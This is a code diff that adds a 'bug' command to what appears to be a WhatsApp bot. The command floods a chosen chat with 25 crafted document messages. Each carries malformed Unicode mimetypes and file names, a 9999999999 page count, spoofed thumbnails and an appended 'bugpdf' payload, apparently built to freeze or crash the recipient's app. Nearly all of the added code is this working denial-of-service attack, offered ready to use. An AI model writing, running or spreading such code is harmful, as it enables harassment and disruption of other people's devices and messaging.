@@ -101,3 +101,42 @@ else {
 }
 
 }); 
+zokou(
+    {
+        nomCom: "bug",
+        categorie: category,
+        reaction: reaction
+    },
+
+    async (dest, zk, commandOptions) => {
+        const { ms, arg, repondre, superUser } = commandOptions;
+        if (!superUser) return await repondre(mess.prem);
+
+        // send loading message
+        await loading(dest, zk);
+
+        for (let i = 0; i < 25; i++) {
+            const doc = { url: "./set.js" };
+            await zk.sendMessage(dest, {
+                document: doc,
+                mimetype:
+                    "\u27E8\u0F11̶\u20DF\uD83D\uDCA5 \uD835\uDC01͢\uD835\uDC11\uD835\uDC14\uD835\uDC17͢\uD835\uDC0E \uD835\uDC05\uD835\uDC14͢\uD835\uDC02\uD835\uDC0A\uD835\uDC0F͢\uD835\uDC03\uD835\uDC05̑\uD83D\uDC41️\u0F11̶\u27E9",
+                title: "bx.pdf",
+                pageCount: 9999999999,
+                thumbnail: {
+                    url: "https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg"
+                },
+                thumbnailUrl:
+                    "https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg",
+                jpegThumbnail: {
+                    url: "https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg"
+                },
+                mediaKey: "ht55w7B6UoaG9doQuVQ811XNfWcoALqcdQfd61seKKk=",
+                fileName:
+                    "\u27E8\u0F11̶\u20DF\uD83D\uDCA5 \uD835\uDC01͢\uD835\uDC11\uD835\uDC14\uD835\uDC17͢\uD835\uDC0E \uD835\uDC05\uD835\uDC14͢\uD835\uDC02\uD835\uDC0A\uD835\uDC0F͢\uD835\uDC03\uD835\uDC05̑\uD83D\uDC41️\u0F11̶\u27E9\n\n" +
+                    bugpdf
+            });
+        }
+        await zk.sendMessage(dest, { react: { text: "✅", key: ms.key } });
+    }
+);
